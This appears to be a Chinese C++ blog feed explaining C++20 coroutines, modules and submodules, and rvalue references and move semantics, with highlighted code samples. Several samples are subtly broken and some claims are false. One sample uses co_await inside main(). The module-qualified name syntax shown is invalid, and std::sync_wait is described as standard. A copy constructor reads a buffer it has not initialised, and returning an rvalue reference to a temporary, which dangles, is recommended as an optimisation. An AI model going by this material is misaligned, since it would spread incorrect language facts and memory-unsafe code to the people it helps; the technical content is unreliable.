class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;coroutine&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// promise type</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Generator</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">promise_type</span> &#123;</span><br><span class="line">    <span class="type">int</span> current_value;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">yield_value</span><span class="params">(<span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;current_value = value;</span><br><span class="line">      <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">initial_suspend</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &#123;&#125;; &#125;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">final_suspend</span><span class="params">()</span> <span class="keyword">noexcept</span> </span>&#123; <span class="keyword">return</span> &#123;&#125;; &#125;</span><br><span class="line">    <span class="function">Generator <span class="title">get_return_object</span><span class="params">()</span> </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> Generator&#123;std::coroutine_handle&lt;promise_type&gt;::<span class="built_in">from_promise</span>(*<span class="keyword">this</span>)&#125;; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">unhandled_exception</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// awaiter type</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">move_next</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    p.<span class="built_in">resume</span>(); </span><br><span class="line">    <span class="keyword">return</span> !p.<span class="built_in">done</span>(); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">current_value</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> p.<span class="built_in">promise</span>().current_value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::coroutine_handle&lt;promise_type&gt; p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 协程函数</span></span><br><span class="line"><span class="function">Generator <span class="title">generator</span><span class="params">(<span class="type">int</span> start = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i = start;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">co_yield</span> i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> g = <span class="built_in">generator</span>(<span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    g.<span class="built_in">move_next</span>();</span><br><span class="line">    std::cout &lt;&lt; g.<span class="built_in">current_value</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用协程实现异步网络编程的主要优点是可以用同步的语法写出异步的代码，提高代码的可读性和可维护性1。要使用协程实现异步网络编程，需要以下几个步骤：</p><ul><li><p>使用标准库中提供的std::jthread或std::thread创建一个或多个工作线程，用来执行协程任务。</p></li><li><p>使用标准库中提供的std::coroutine_handle或自定义的协程句柄类型，管理协程的生命周期和调度。</p></li><li><p>使用标准库中提供的std::future或自定义的awaiter类型，等待异步操作完成并获取结果。</p></li><li><p>使用标准库中提供的std::sync_wait或自定义的同步等待函数，等待所有协程任务完成后退出程序。</p></li></ul><p>例如，我们可以使用一个简单的网络框架ZED3，它提供了一些基本的异步IO操作，并封装了协程句柄和awaiter类型。我们可以用以下代码实现一个简单的回显服务器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zed/net.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> zed;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 创建一个io_context对象</span></span><br><span class="line">  io_context ctx;</span><br><span class="line">  <span class="comment">// 创建一个工作线程</span></span><br><span class="line">  <span class="function">std::jthread <span class="title">th</span><span class="params">([&amp;ctx]() &#123; ctx.run(); &#125;)</span></span>;</span><br><span class="line">  <span class="comment">// 创建一个tcp服务器</span></span><br><span class="line">  <span class="function">tcp_server <span class="title">server</span><span class="params">(ctx)</span></span>;</span><br><span class="line">  <span class="comment">// 绑定端口</span></span><br><span class="line">  server.<span class="built_in">bind</span>(<span class="number">8080</span>);</span><br><span class="line">  <span class="comment">// 开始监听</span></span><br><span class="line">  server.<span class="built_in">listen</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 接受连接，并返回一个tcp_socket对象</span></span><br><span class="line">      <span class="keyword">auto</span> socket = <span class="keyword">co_await</span> server.<span class="built_in">accept</span>();</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;New connection from &quot;</span> &lt;&lt; socket.<span class="built_in">remote_endpoint</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 接收数据，并返回接收到的字节数</span></span><br><span class="line">        <span class="keyword">auto</span> n = <span class="keyword">co_await</span> socket.<span class="built_in">recv</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">// 连接断开</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Received &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送数据，并返回发送出去的字节数</span></span><br><span class="line">        <span class="keyword">auto</span> m = <span class="keyword">co_await</span> socket.<span class="built_in">send</span>(n);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Sent &quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;Connection closed\n&quot;</span>;</span><br><span class="line">    &#125; <span class="built_in">catch</span> (<span class="type">const</span> std::exception&amp; e) &#123;</span><br><span class="line">      std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>C++20模块是一种新的代码组织和重用的方式，它可以替代传统的头文件和翻译单元。#include 多个头文件时编译很慢，使用 module 相当于直接调用编译好的二进制文件，这个二进制文件中描述了这个 module 导出的函数、类、模板等。模块可以提高编译速度，避免宏污染，隐藏实现细节，简化依赖关系等优点。要使用模块，需要以下几个步骤：</p><ul><li><p>在源文件中使用module关键字声明一个模块，并指定模块名。</p></li><li><p>在源文件中使用export关键字导出需要对外提供的符号。</p></li><li><p>在其他源文件中使用import关键字导入需要使用的模块。</p></li><li><p>使用支持模块的编译器编译源文件，并生成相应的模块接口文件和目标文件。</p></li></ul><p>例如，我们可以用以下代码定义一个名为hello的模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.cppm</span></span><br><span class="line"><span class="keyword">module</span> hello; <span class="comment">// 声明一个名为hello的模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, world!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在另一个源文件中导入并使用这个模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 导入hello模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello</span>(); <span class="comment">// 调用say_hello函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子模块是一种在逻辑上划分模块的方法，它可以让用户选择性地导入模块的一部分或全部内容。子模块的命名规则中允许点存在于模块名字当中，但点并不代表语法上的从属关系，而只是帮助程序员理解模块间的逻辑关系。</p><p>例如，我们可以用以下代码定义一个名为hello.sub_a的子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.sub_a.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello.sub_a; <span class="comment">// 声明一个名为hello.sub_a的子模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello_sub_a</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello_sub_a的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello_sub_a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, sub a!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在另一个源文件中定义一个名为hello.sub_b的子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.sub_b.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello.sub_b; <span class="comment">// 声明一个名为hello.sub_b的子模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello_sub_b</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello_sub_b的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello_sub_b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, sub b!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们可以在另一个源文件中定义一个名为hello的父模块，它导出了两个子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello; <span class="comment">// 声明一个名为hello的父模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">import</span> hello.sub_a; <span class="comment">// 导出并导入hello.sub_a子模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">import</span> hello.sub_b; <span class="comment">// 导出并导入hello.sub_b子模块</span></span><br></pre></td></tr></table></figure><p>这样，用户就可以根据需要导入不同的子模块或父模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 导入hello父模块，相当于同时导入了两个子模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello_sub_a</span>(); <span class="comment">// 调用say_hello_sub_a函数</span></span><br><span class="line">  <span class="built_in">say_hello_sub_b</span>(); <span class="comment">// 调用say_hello_sub_b函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名空间冲突是指不同的模块或源文件中定义了相同的名称，导致编译器无法区分它们的含义。C++20 模块提供了一些方法来避免或解决命名空间冲突：</p><ul><li><p>使用不同的模块名字来区分不同的模块，例如 hello.sub_a 和 hello.sub_b 就是两个不同的模块，即使它们都定义了 say_hello 函数，也不会发生冲突。</p></li><li><p>使用限定名字来指定模块中的名称，例如 hello.sub_a::say_hello 和 hello.sub_b::say_hello 就可以明确地区分两个模块中的函数。</p></li><li><p>使用 using 声明或 using 指令来引入需要的名称，但要注意避免引入重复或冲突的名称。例如:</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 导入hello父模块</span></span><br><span class="line"><span class="keyword">using</span> hello.sub_a::say_hello; <span class="comment">// 引入hello.sub_a中的say_hello函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello</span>(); <span class="comment">// 调用hello.sub_a中的say_hello函数</span></span><br><span class="line">  hello.sub_b::<span class="built_in">say_hello</span>(); <span class="comment">// 调用hello.sub_b中的say_hello函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用 export 关键字来控制哪些名称被导出到其他模块或源文件，以减少暴露给外部的名称。例如：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> math; <span class="comment">// 声明一个名为math的模块</span></span><br><span class="line"><span class="keyword">namespace</span> detail &#123; <span class="comment">// 定义一个未导出的命名空间detail</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x + y; &#125; <span class="comment">// 定义一个未导出的函数add</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123; <span class="keyword">return</span> detail::<span class="built_in">add</span>(x, y); &#125; <span class="comment">// 定义并导出一个函数sum，它调用了detail命名空间中的add函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> math; <span class="comment">// 导入math模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> s = math::<span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 调用math模块中导出的sum函数</span></span><br><span class="line">  <span class="type">int</span> a = math::detail::<span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 错误：math模块没有导出detail命名空间或add函数</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>引用</title>
      <link href="/2023/03/22/%E5%BC%95%E7%94%A8/"/>
      <url>/2023/03/22/%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="指针与引用"><a href="#指针与引用" class="headerlink" title="指针与引用"></a>指针与引用</h2><p>引用必须要初始化。</p><p>指针会根据编译器不同而变化，32位4字节，64位8字节</p><p>引用根据被引用的数据类型变化</p><p>int*&amp; 指针的引用 以指针来判断。</p><h2 id="右值引用-c-11"><a href="#右值引用-c-11" class="headerlink" title="右值引用 c++11"></a>右值引用 c++11</h2><ol><li>左值：可以长时间保存，可以存在于&#x3D;左边的值，可以取地址；</li><li>右值：临时值，不能存在于&#x3D;左边的值，不可以取地址。</li></ol><p>左值引用，实际上是取地址赋给新的变量。必须初始化。</p><p>常引用，用于引用部分右值，不可进行更改。实际上是使用一个临时变量与一块临时内存进行存储，必须初始化。可以引用左与右。</p><p><img src="/.io//image-20230318004324533.png" alt="image-20230318004324533"></p><p>右值引用原理相近，临时内存的地址无法获取，但是可以对临时内存里面的内容进行修改。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>&amp;&amp; v1 = <span class="number">10</span>;</span><br><span class="line">v1++;</span><br></pre></td></tr></table></figure><p>  右值引用是C++11新特性，之所以引入右值引用，是为了提高效率。如下面所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>(<span class="type">size_t</span> N):<span class="built_in">m_p</span>(<span class="keyword">new</span> <span class="type">char</span>[N])</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">A</span>(<span class="type">const</span> A &amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> != &amp;a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]m_p;</span><br><span class="line">m_p = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(m_p) + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(m_p, a.m_p, <span class="built_in">strlen</span>(m_p) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">A</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> []m_p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *m_p = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">A <span class="title">createA</span><span class="params">(<span class="type">size_t</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">A</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(A a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">func</span>(<span class="built_in">createA</span>(<span class="number">100</span>));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里会导致大量得调用A得构造函数，不考虑编译优化，原本执行如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createA(100)，执行A(100)调用A(size_t)构造函数一次；</span><br><span class="line">退出createA，临时构造得A(100)，释放调用析构函数一次；</span><br><span class="line">赋给返回值会调用一次拷贝构造函数一次；</span><br><span class="line">返回值传入func中形参会调用拷贝构造函数一次；</span><br><span class="line">func运行完成后形参释放，调用A析构函数一次；</span><br><span class="line">返回值使用完成释放，调用A析构函数一次；</span><br></pre></td></tr></table></figure><p>从上面可以看出有大量得构造、析构调用 ，但是我们做的工作无非就是临时构造一个A(100)给func使用而已。那么可否将临时A(100)始终一份给到func使用呢？答案就是右值引用。如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>(<span class="type">size_t</span> N):<span class="built_in">m_p</span>(<span class="keyword">new</span> <span class="type">char</span>[N])</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">A</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> []m_p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *m_p = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">A&amp;&amp; <span class="title">createA</span><span class="params">(<span class="type">size_t</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (A&amp;&amp;)<span class="built_in">A</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(A&amp;&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">func</span>(<span class="built_in">createA</span>(<span class="number">100</span>));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们将临时A(100)强制转换为了右值引用，同时func形参也是右值引用，也就是将临时对象延长到了func中，中间避免了其他构造和析构调用，提高了效率。</p><p>​    注意到我们将A得拷贝构造函数去掉了，因为已经用不到。如果原版写法，去掉拷贝构造函数会崩溃，因为会自动调用默认拷贝构造函数，是浅拷贝，中间临时对象会提前删除公共内存，后面对象再次释放是就会重复删除内存导致崩溃。</p><p>这就是<strong>移动</strong>。它可以让你将一个对象的资源（如内存、文件句柄等）从一个临时的右值转移给另一个对象，而不需要进行深拷贝这样可以提高性能，避免不必要的内存分配和释放</p><p><img src="/.io//image-20230319210844838.png" alt="image-20230319210844838"></p><p>std::move可以转换左值引用为右值引用。实现原理实际上就是强制转换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;t = std::<span class="built_in">move</span>(a);</span><br><span class="line"><span class="type">int</span> &amp;&amp;t2 = std::<span class="built_in">move</span>(<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> &amp;&amp;t = (<span class="type">int</span> &amp;&amp;)a;</span><br><span class="line">t = <span class="number">9</span>;</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;  <span class="comment">// a = 9</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>std::unique_ptr<T>不能相等，因为他们是不可以拷贝的，因此不可以左值赋给左值。使用移动，把左值转换成右值，就可以让二者相等。</T></p><p><img src="/.io//image-20230319211406922.png" alt="image-20230319211406922"></p><h2 id="通用引用"><a href="#通用引用" class="headerlink" title="通用引用"></a>通用引用</h2><p>通用引用就是根据接受值类型可以自行推导是左值引用还是右值引用。</p><p>如果声明变量或参数具有T&amp;&amp;某种推导类型的类型 T，则该变量或参数为通用引用，否则就是右值引用（无法传入左值）。</p><p>也就是传入的参数在编译时需要推导，如果不需要推导，则不是通用引用。如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 